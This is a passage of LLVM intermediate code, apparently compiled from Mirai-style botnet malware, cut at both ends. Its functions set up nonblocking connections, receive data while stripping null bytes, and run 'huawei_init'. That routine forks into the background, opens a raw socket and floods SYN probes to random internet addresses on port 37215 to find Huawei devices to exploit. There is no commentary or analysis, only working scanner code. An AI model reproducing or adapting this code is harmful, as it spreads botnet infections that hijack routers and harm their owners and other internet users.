; <label>:105:                                    ; preds = %101, %97, %93
  %106 = load i8, i8* %2, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp sge i32 %107, 224
  br i1 %108, label %163, label %109

; <label>:109:                                    ; preds = %105
  %110 = load i8, i8* %2, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 6
  br i1 %112, label %161, label %113

; <label>:113:                                    ; preds = %109
  %114 = load i8, i8* %2, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 7
  br i1 %116, label %161, label %117

; <label>:117:                                    ; preds = %113
  %118 = load i8, i8* %2, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 11
  br i1 %120, label %161, label %121

; <label>:121:                                    ; preds = %117
  %122 = load i8, i8* %2, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 21
  br i1 %124, label %161, label %125

; <label>:125:                                    ; preds = %121
  %126 = load i8, i8* %2, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 22
  br i1 %128, label %161, label %129

; <label>:129:                                    ; preds = %125
  %130 = load i8, i8* %2, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 26
  br i1 %132, label %161, label %133

; <label>:133:                                    ; preds = %129
  %134 = load i8, i8* %2, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 28
  br i1 %136, label %161, label %137

; <label>:137:                                    ; preds = %133
  %138 = load i8, i8* %2, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 29
  br i1 %140, label %161, label %141

; <label>:141:                                    ; preds = %137
  %142 = load i8, i8* %2, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 30
  br i1 %144, label %161, label %145

; <label>:145:                                    ; preds = %141
  %146 = load i8, i8* %2, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 33
  br i1 %148, label %161, label %149

; <label>:149:                                    ; preds = %145
  %150 = load i8, i8* %2, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 55
  br i1 %152, label %161, label %153

; <label>:153:                                    ; preds = %149
  %154 = load i8, i8* %2, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 214
  br i1 %156, label %161, label %157

; <label>:157:                                    ; preds = %153
  %158 = load i8, i8* %2, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 215
  br label %161

; <label>:161:                                    ; preds = %157, %153, %149, %145, %141, %137, %133, %129, %125, %121, %117, %113, %109
  %162 = phi i1 [ true, %153 ], [ true, %149 ], [ true, %145 ], [ true, %141 ], [ true, %137 ], [ true, %133 ], [ true, %129 ], [ true, %125 ], [ true, %121 ], [ true, %117 ], [ true, %113 ], [ true, %109 ], [ %160, %157 ]
  br label %163

; <label>:163:                                    ; preds = %161, %105, %101, %89, %81, %69, %57, %49, %45, %41, %37, %33, %29, %25
  %164 = phi i1 [ true, %105 ], [ true, %101 ], [ true, %89 ], [ true, %81 ], [ true, %69 ], [ true, %57 ], [ true, %49 ], [ true, %45 ], [ true, %41 ], [ true, %37 ], [ true, %33 ], [ true, %29 ], [ true, %25 ], [ %162, %161 ]
  br i1 %164, label %6, label %165

; <label>:165:                                    ; preds = %163
  %166 = load i8, i8* %2, align 1
  %167 = zext i8 %166 to i32
  %168 = shl i32 %167, 24
  %169 = load i8, i8* %3, align 1
  %170 = zext i8 %169 to i32
  %171 = shl i32 %170, 16
  %172 = or i32 %168, %171
  %173 = load i8, i8* %4, align 1
  %174 = zext i8 %173 to i32
  %175 = shl i32 %174, 8
  %176 = or i32 %172, %175
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = shl i32 %178, 0
  %180 = or i32 %176, %179
  %181 = call i32 @htonl(i32 %180) #9
  ret i32 %181
}

declare zeroext i16 @checksum_generic(i16*, i32) #5

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #5

; Function Attrs: noinline nounwind uwtable
define internal void @exploit_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %71

; <label>:21:                                     ; preds = %15
  %22 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %42, i32 0, i32 4
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @exploit_fake_time, align 4
  %47 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %47, i32 0, i32 1
  store i32 %46, i32* %48, align 4
  %49 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %49, i32 0, i32 2
  %51 = load i32, i32* %50, align 8
  %52 = icmp eq i32 %51, 3
  br i1 %52, label %58, label %53

; <label>:53:                                     ; preds = %21
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 8
  %57 = icmp eq i32 %56, 4
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %53, %21
  br label %62

; <label>:59:                                     ; preds = %53
  %60 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %61 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %60, i32 0, i32 2
  store i32 1, i32* %61, align 8
  br label %62

; <label>:62:                                     ; preds = %59, %58
  %63 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %64 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %63, i32 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @connect(i32 %65, %struct.sockaddr* %69, i32 16)
  br label %71

; <label>:71:                                     ; preds = %62, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @exploit_recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21

; <label>:42:                                     ; preds = %21
  br label %43

; <label>:43:                                     ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @huawei_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @huawei_scanner_pid, align 4
  %35 = load i32, i32* @huawei_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %0
  %38 = load i32, i32* @huawei_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37, %0
  ret void

; <label>:41:                                     ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* null) #6
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @huawei_fake_time, align 4
  %45 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %46 = bitcast i8* %45 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %46, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %61, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %64

; <label>:50:                                     ; preds = %47
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i64 %53
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  store i32 0, i32* %55, align 8
  %56 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %57 = load i32, i32* %1, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %56, i64 %58
  %60 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i32 0, i32 0
  store i32 -1, i32* %60, align 8
  br label %61

; <label>:61:                                     ; preds = %50
  %62 = load i32, i32* %1, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %1, align 4
  br label %47

; <label>:64:                                     ; preds = %47
  %65 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %65, i32* @huawei_rsck, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %64
  call void @exit(i32 0) #12
  unreachable

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* @huawei_rsck, align 4
  %70 = load i32, i32* @huawei_rsck, align 4
  %71 = call i32 (i32, i32, ...) @fcntl(i32 %70, i32 3, i32 0)
  %72 = or i32 2048, %71
  %73 = call i32 (i32, i32, ...) @fcntl(i32 %69, i32 4, i32 %72)
  store i32 1, i32* %1, align 4
  %74 = load i32, i32* @huawei_rsck, align 4
  %75 = bitcast i32* %1 to i8*
  %76 = call i32 @setsockopt(i32 %74, i32 0, i32 3, i8* %75, i32 4) #6
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %81

; <label>:78:                                     ; preds = %68
  %79 = load i32, i32* @huawei_rsck, align 4
  %80 = call i32 @close(i32 %79)
  call void @exit(i32 0) #12
  unreachable

; <label>:81:                                     ; preds = %68
  br label %82

; <label>:82:                                     ; preds = %86, %81
  %83 = call i32 @rand_next()
  %84 = and i32 %83, 65535
  %85 = trunc i32 %84 to i16
  store i16 %85, i16* %2, align 2
  br label %86

; <label>:86:                                     ; preds = %82
  %87 = load i16, i16* %2, align 2
  %88 = call zeroext i16 @ntohs(i16 zeroext %87) #9
  %89 = zext i16 %88 to i32
  %90 = icmp slt i32 %89, 1024
  br i1 %90, label %82, label %91

; <label>:91:                                     ; preds = %86
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i64 1
  %94 = bitcast %struct.iphdr* %93 to %struct.anon.0*
  store %struct.anon.0* %94, %struct.anon.0** %4, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = load i8, i8* %96, align 4
  %98 = and i8 %97, -16
  %99 = or i8 %98, 5
  store i8 %99, i8* %96, align 4
  %100 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %101 = bitcast %struct.iphdr* %100 to i8*
  %102 = load i8, i8* %101, align 4
  %103 = and i8 %102, 15
  %104 = or i8 %103, 64
  store i8 %104, i8* %101, align 4
  %105 = call zeroext i16 @htons(i16 zeroext 40) #9
  %106 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 2
  store i16 %105, i16* %107, align 2
  %108 = call i32 @rand_next()
  %109 = trunc i32 %108 to i16
  %110 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 3
  store i16 %109, i16* %111, align 4
  %112 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %112, i32 0, i32 5
  store i8 64, i8* %113, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 6
  store i8 6, i8* %115, align 1
  %116 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %117 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %118 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %117, i32 0, i32 1
  store i16 %116, i16* %118, align 2
  %119 = load i16, i16* %2, align 2
  %120 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %121 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %120, i32 0, i32 0
  store i16 %119, i16* %121, align 4
  %122 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %123 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -241
  %126 = or i16 %125, 80
  store i16 %126, i16* %123, align 4
  %127 = call i32 @rand_next()
  %128 = and i32 %127, 65535
  %129 = trunc i32 %128 to i16
  %130 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 5
  store i16 %129, i16* %131, align 2
  %132 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %133 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -513
  %136 = or i16 %135, 512
  store i16 %136, i16* %133, align 4
  br label %137

; <label>:137:                                    ; preds = %718, %91
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %138 = load i32, i32* @huawei_fake_time, align 4
  %139 = load i32, i32* %10, align 4
  %140 = icmp ne i32 %138, %139
  br i1 %140, label %141, label %205

; <label>:141:                                    ; preds = %137
  %142 = load i32, i32* @huawei_fake_time, align 4
  store i32 %142, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %143

; <label>:143:                                    ; preds = %201, %141
  %144 = load i32, i32* %1, align 4
  %145 = icmp slt i32 %144, 160
  br i1 %145, label %146, label %204

; <label>:146:                                    ; preds = %143
  %147 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %147, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %148 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i64 1
  %150 = bitcast %struct.iphdr* %149 to %struct.anon.0*
  store %struct.anon.0* %150, %struct.anon.0** %16, align 8
  %151 = call i32 @rand_next()
  %152 = trunc i32 %151 to i16
  %153 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i32, i32* @LOCAL_ADDR, align 4
  %156 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 8
  store i32 %155, i32* %157, align 4
  %158 = call i32 @get_random_ip.76()
  %159 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 7
  store i16 0, i16* %162, align 2
  %163 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %164 = bitcast %struct.iphdr* %163 to i16*
  %165 = call zeroext i16 @checksum_generic(i16* %164, i32 20)
  %166 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 7
  store i16 %165, i16* %167, align 2
  %168 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %169 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 1
  store i16 %168, i16* %170, align 2
  %171 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %175 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %174, i32 0, i32 2
  store i32 %173, i32* %175, align 4
  %176 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 6
  store i16 0, i16* %177, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %179 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %180 = bitcast %struct.anon.0* %179 to i8*
  %181 = call zeroext i16 @htons(i16 zeroext 20) #9
  %182 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %178, i8* %180, i16 zeroext %181, i32 20)
  %183 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %184 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %183, i32 0, i32 6
  store i16 %182, i16* %184, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  %188 = load i32, i32* %187, align 4
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %190 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %189, i32 0, i32 0
  store i32 %188, i32* %190, align 4
  %191 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 1
  %193 = load i16, i16* %192, align 2
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = load i32, i32* @huawei_rsck, align 4
  %196 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %197 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %197, %struct.sockaddr** %196, align 8
  %198 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %199 = load %struct.sockaddr*, %struct.sockaddr** %198, align 8
  %200 = call i64 @sendto(i32 %195, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %199, i32 16)
  br label %201

; <label>:201:                                    ; preds = %146
  %202 = load i32, i32* %1, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %1, align 4
  br label %143

; <label>:204:                                    ; preds = %143
  br label %205

; <label>:205:                                    ; preds = %204, %137
  store i32 0, i32* %9, align 4
  br label %206

; <label>:206:                                    ; preds = %339, %311, %299, %291, %283, %275, %267, %258, %249, %242, %235, %205
  store i32 0, i32* %18, align 4
  %207 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %208 = bitcast i8* %207 to %struct.iphdr*
  store %struct.iphdr* %208, %struct.iphdr** %20, align 8
  %209 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i64 1
  %211 = bitcast %struct.iphdr* %210 to %struct.anon.0*
  store %struct.anon.0* %211, %struct.anon.0** %21, align 8
  %212 = call i32* @__errno_location() #9
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* @huawei_rsck, align 4
  %214 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %215 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %215, align 8
  %216 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %217 = load %struct.sockaddr*, %struct.sockaddr** %216, align 8
  %218 = call i64 @recvfrom(i32 %213, i8* %214, i64 1514, i32 16384, %struct.sockaddr* %217, i32* null)
  %219 = trunc i64 %218 to i32
  store i32 %219, i32* %18, align 4
  %220 = load i32, i32* %18, align 4
  %221 = icmp sle i32 %220, 0
  br i1 %221, label %230, label %222

; <label>:222:                                    ; preds = %206
  %223 = call i32* @__errno_location() #9
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 11
  br i1 %225, label %230, label %226

; <label>:226:                                    ; preds = %222
  %227 = call i32* @__errno_location() #9
  %228 = load i32, i32* %227, align 4
  %229 = icmp eq i32 %228, 11
  br i1 %229, label %230, label %231

; <label>:230:                                    ; preds = %226, %222, %206
  br label %351

; <label>:231:                                    ; preds = %226
  %232 = load i32, i32* %18, align 4
  %233 = sext i32 %232 to i64
  %234 = icmp ult i64 %233, 40
  br i1 %234, label %235, label %236

; <label>:235:                                    ; preds = %231
  br label %206

; <label>:236:                                    ; preds = %231
  %237 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 9
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* @LOCAL_ADDR, align 4
  %241 = icmp ne i32 %239, %240
  br i1 %241, label %242, label %243

; <label>:242:                                    ; preds = %236
  br label %206

; <label>:243:                                    ; preds = %236
  %244 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 6
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 6
  br i1 %248, label %249, label %250

; <label>:249:                                    ; preds = %243
  br label %206

; <label>:250:                                    ; preds = %243
  %251 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %252 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %251, i32 0, i32 0
  %253 = load i16, i16* %252, align 4
  %254 = zext i16 %253 to i32
  %255 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %256 = zext i16 %255 to i32
